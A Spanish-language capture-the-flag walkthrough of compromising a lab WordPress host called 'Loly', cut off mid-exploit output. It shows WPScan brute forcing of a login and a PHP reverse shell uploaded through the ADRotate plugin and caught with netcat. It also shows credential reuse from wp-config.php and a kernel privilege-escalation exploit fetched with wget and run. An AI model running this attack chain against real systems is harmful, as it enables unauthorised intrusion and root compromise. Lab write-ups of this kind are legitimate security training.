&lt;p&gt;Procedemos a enumerar la web&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /wordpress/: Blog
|_  /wordpress/wp-login.php: Wordpress login page.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a usar la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WPSCAN&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;         __          _______   _____
         &lt;span class=&quot;se&quot;&gt;\ \ &lt;/span&gt;       / /  __ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;/ ____|
          &lt;span class=&quot;se&quot;&gt;\ \ &lt;/span&gt; /&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; / /| |__&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;___   ___  __ _ _ __ ®
           &lt;span class=&quot;se&quot;&gt;\ \/&lt;/span&gt;  &lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt; / |  ___/ &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;/ __|/ _&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; | &lt;span class=&quot;s1&quot;&gt;&apos;_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.14
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+][0m URL: http://192.168.224.121/wordpress/ [192.168.224.121]
[+][0m Started: Tue May 10 20:43:29 2022

Interesting Finding(s):

[+][0m Headers
 | Interesting Entry: Server: nginx/1.10.3 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+][0m XML-RPC seems to be enabled: http://192.168.224.121/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+][0m WordPress readme found: http://192.168.224.121/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+][0m The external WP-Cron seems to be enabled: http://192.168.224.121/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+][0m WordPress version 5.5 identified (Insecure, released on 2020-08-11).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://192.168.224.121/wordpress/, Match: &apos;&lt;/span&gt;wp-includes&lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;js&lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;wp-emoji-release.min.js?ver&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;5.5&lt;span class=&quot;s1&quot;&gt;&apos;
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://192.168.224.121/wordpress/, Match: &apos;&lt;/span&gt;WordPress 5.5&lt;span class=&quot;s1&quot;&gt;&apos;

[[i][0m The main theme could not be detected.
[i][0m No plugins Found.
[i][0m No themes Found.
[i][0m No Timthumbs Found.
[i][0m No Config Backups Found.
[i][0m No DB Exports Found.
[i][0m Medias(s) Identified:

[+][0m http://192.168.224.121/wordpress/?attachment_id=12
 | Found By: Attachment Brute Forcing (Aggressive Detection)


[i][0m User(s) Identified:

[+][0m loly
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!][0m No WPScan API Token given, as a result vulnerability data has not been output.
[!][0m You can get a free API token with 50 daily requests by registering at https://wpscan.com/register

[+][0m Finished: Tue May 10 20:43:56 2022
[+][0m Requests Done: 3369
[+][0m Cached Requests: 27
[+][0m Data Sent: 1007.486 KB
[+][0m Data Received: 641.986 KB
[+][0m Memory used: 269.203 MB
[+][0m Elapsed time: 00:00:27
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Encontramos el user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;loly&lt;/code&gt;
Procedemos a hacer fuerza bruta para el user encontrado&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;-------------&lt;/span&gt; Fuerza Bruta con WPSCAN + ROCKYOU.txt &lt;span class=&quot;nt&quot;&gt;--------------------&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# wpscan --url http://192.168.224.121/wordpress --usernames loly --passwords /usr/share/wordlists/rockyou.txt --no-banner                                                                                   2 ⨯  &lt;/span&gt;
WARNING: Nokogiri was built against libxml version 2.9.10, but has dynamically loaded 2.9.12             
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;i] It seems like you have not updated the database &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;some time.
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;?] Do you want to update now? &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Y]es &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;N]o, default: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;N]n                                                 
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] URL: http://192.168.224.121/wordpress/ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.224.121]                                                            
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Started: Tue May 10 20:48:47 2022                                                                    
                                                                                                                                            
Interesting Finding&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:                                                                                  
                                                                                                                                            
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Headers                                                                                                             
 | Interesting Entry: Server: nginx/1.10.3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                         
 | Found By: Headers &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Passive Detection&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                
 | Confidence: 100%                                                                                                                                                      
                                                                                                                                                                         
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] XML-RPC seems to be enabled: http://192.168.224.121/wordpress/xmlrpc.php                                                                
 | Found By: Direct Access &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Aggressive Detection&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                        
 | Confidence: 100%                                                                                                                                                                                               
 | References:                                              
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API                                                                                       
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner                                  
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos                                                                                                                                                                  
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login                                                       
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access                                                                                                                          
                                                                                                                                            
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] WordPress readme found: http://192.168.224.121/wordpress/readme.html                                                
 | Found By: Direct Access &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Aggressive Detection&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                           
 | Confidence: 100%                                                                                                                                                                                                                              
                                                                                                         
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] The external WP-Cron seems to be enabled: http://192.168.224.121/wordpress/wp-cron.php               
 | Found By: Direct Access &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Aggressive Detection&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                                                        
 | Confidence: 60%                                  
 | References:                                                                                                          
 |  - https://www.iplocation.net/defend-wordpress-from-ddos                                                             
 |  - https://github.com/wpscanteam/wpscan/issues/1299                                                                                      
                                                                                                                                                                                                                                                                                         
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] WordPress version 5.5 identified &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Insecure, released on 2020-08-11&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
 | Found By: Emoji Settings &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Passive Detection&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;     
 |  - http://192.168.224.121/wordpress/, Match: &lt;span class=&quot;s1&quot;&gt;&apos;wp-includes\/js\/wp-emoji-release.min.js?ver=5.5&apos;&lt;/span&gt;
 | Confirmed By: Meta Generator &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Passive Detection&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                      
 |  - http://192.168.224.121/wordpress/, Match: &lt;span class=&quot;s1&quot;&gt;&apos;WordPress 5.5&apos;&lt;/span&gt;                                                                                                                                                   
                                                                                                                                                                                                                                                                                         
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;i] The main theme could not be detected.                                                                
                                                                                                                        
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Enumerating All Plugins &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;via Passive Methods&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                                                                                                                                
                                                                                                                                                                         
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;i] No plugins Found.                                                                                                                       
                                                                                                                                                                                                                                                                                                                                                  
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Enumerating Config Backups &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;via Passive and Aggressive Methods&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 Checking Config Backups - Time: 00:00:01 &amp;lt;&lt;span class=&quot;o&quot;&gt;===================================================================================================================================&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;137 / 137&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 100.00% Time: 00:00:01 
                                                                      
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;i] No Config Backups Found.                                          
                                                                                                                                                                         
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Performing password attack on Xmlrpc against 1 user/s                                                                                                                
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;SUCCESS] - loly / fernando                                           
Trying loly / corazon Time: 00:00:02 &amp;lt;                                                                                                                                    &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;175 / 14344573&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  0.00%  ETA: ??:??:?? 
                                                                                    
&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Valid Combinations Found:                                                                                                               
 | Username: loly, Password: fernando                                                                                                                                                                                                                             
                                                                                    
&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; No WPScan API Token given, as a result vulnerability data has not been output.   
&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; You can get a free API token with 50 daily requests by registering at https://wpscan.com/register

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Finished: Tue May 10 20:48:54 2022                                                                                                                                   
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Requests Done: 316                                                                                                                                                                                                                                                                                                                            
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Cached Requests: 29                                                                                  
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Data Sent: 133.992 KB                                                                                
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Data Received: 128.072 KB                                                                            
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Memory used: 229.09 MB                                                                               
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Elapsed &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 00:00:07 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;User &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;loly&lt;/code&gt; Password &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fernando&lt;/code&gt;
Procedemos a loguearnos al &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wp-login.php&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Accedemos al wordpress
Rapidamente identificamos el siguiente elemento –&amp;gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ADROTATE&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://loly.lc/wordpress/wp-admin/admin.php?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;adrotate-media&amp;amp;status&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;202
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Resulta que mediante ADRotate apuntando a Manage Media → Tenemos un File Upload
Procedemos a subir un archivo .php pero .zip&lt;/p&gt;

&lt;p&gt;Buscamos por &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;# locate php-reverse-shell&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/usr/share/webshells/php/php-reverse-shell.php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nos traemos el archivo .php modificamos la ip y el puerto
Procedemos a zippear el archivo:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# zip prs.zip prs.php&lt;/span&gt;
updating: prs.php &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;deflated 60%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# ls&lt;/span&gt;
prs.php  prs.zip  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nos ponemos a la escucha con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc -vlnp 443&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Subimos el archivo
Se sube correctamente
Procedemos a Buscar la ruta de subida del archivo&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://loly.lc/wordpress/wp-content/banners/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Apuntamos a nuestro archivo para ganar acceso&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://loly.lc/wordpress/wp-content/banners/prs.php 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Recibimos la consola por nuestra session a la escucha&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# nc -vlnp 443&lt;/span&gt;
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.49.224] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.224.121] 43470
Linux ubuntu 4.4.0-31-generic &lt;span class=&quot;c&quot;&gt;#50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux&lt;/span&gt;
 12:02:22 up  1:10,  0 &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;,  load average: 1.00, 1.01, 0.96
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
bash: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3001&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device
bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
www-data@ubuntu:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
www-data@ubuntu:/var&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;backups  cache  lib  &lt;span class=&quot;nb&quot;&gt;local  &lt;/span&gt;lock  log  mail  opt  run  spool  tmp  www
www-data@ubuntu:/var&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;www
www-data@ubuntu:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;html  local.txt

www-data@ubuntu:~/html/wordpress&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt; 
/var/www/html/wordpress

www-data@ubuntu:~/html/wordpress&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;index.php        wp-blog-header.php    wp-includes        wp-settings.php
license.txt      wp-comments-post.php  wp-links-opml.php  wp-signup.php
readme.html      wp-config.php         wp-load.php        wp-trackback.php
wp-activate.php  wp-content            wp-login.php       xmlrpc.php
wp-admin         wp-cron.php           wp-mail.php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Leemos el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wp-config.php&lt;/code&gt;
Encontramos la siguiente credencial –&amp;gt;  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lolyisabeautifulgirl&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wordpress:lolyisabeautifulgirl → base de datos mysql 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Reutilizacion de Credenciales?? loly ??&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;su loly: lolyisabeautifulgirl
www-data@ubuntu:~/html/wordpress&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su loly
Password: 
loly@ubuntu:/var/www/html/wordpress&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Nos convertimos en el user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;loly&lt;/code&gt; con la credencial encontrada&lt;/p&gt;

&lt;h1 id=&quot;escalada-de-privilegios--kernel-exploit-ubuntu-4403&quot;&gt;Escalada de Privilegios ~ Kernel Exploit (Ubuntu 4.4.0.3)&lt;/h1&gt;

&lt;p&gt;Procedemos a enumerar informacion&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;loly@ubuntu:/var/www/html/wordpress&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;uname&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
Linux ubuntu 4.4.0-31-generic &lt;span class=&quot;c&quot;&gt;#50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Buscamos con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Searchsploit&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; searchsploit ubuntu 4.4.0.3        
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
 Exploit Title                                                                                                                                                                                                 |  Path
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
Linux Kernel 4.10.5 / &amp;lt; 4.14.3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - DCCP Socket Use-After-Free                               | linux/dos/43234.c
Linux Kernel &amp;lt; 4.13.9 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu 16.04 / Fedora 27&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Local Privilege Escalation                                                   | linux/local/45010.c
Linux Kernel &amp;lt; 4.4.0-83 / &amp;lt; 4.8.0-58 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu 14.04/16.04&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Local Privilege Escalation &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;KASLR / SMEP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                           | linux/local/43418.c
Linux Kernel &amp;lt; 4.4.0/ &amp;lt; 4.8.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Local Privilege Escalation &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;KASLR / SMEP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;               | linux/local/47169.c
Ubuntu &amp;lt; 15.10 - PT Chown Arbitrary PTs Access Via User Namespace Privilege Escalation                                                                | linux/local/41760.txt
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Nos traemos el exploit en .c&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gcc 45010.c &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; shell

python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80  &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt; compartiendo shell
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Desde la maquina victima para pasarnos el exploit&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;loly@ubuntu:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget http://IP/shell

loly@ubuntu:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;shell

loly@ubuntu:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x shell

loly@ubuntu:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./shell 
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;.] 
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;.] t&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-_-t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; exploit &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;counterfeit grsec kernels such as KSPP and linux-hardened t&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-_-t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;.] 
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;.]   &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt; This vulnerability cannot be exploited at all on authentic grsecurity kernel &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;.] 
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; creating bpf map
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; sneaking evil bpf past the verifier
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; creating socketpair&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; attaching bpf backdoor to socket
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; skbuff &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; ffff88003489f000
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Leaking sock struct from ffff88007bd9e3c0
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Sock-&amp;gt;sk_rcvtimeo at offset 472
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Cred structure at ffff880034959780
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; UID from cred structure: 1000, matches the current: 1000
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; hammering cred structure at ffff880034959780
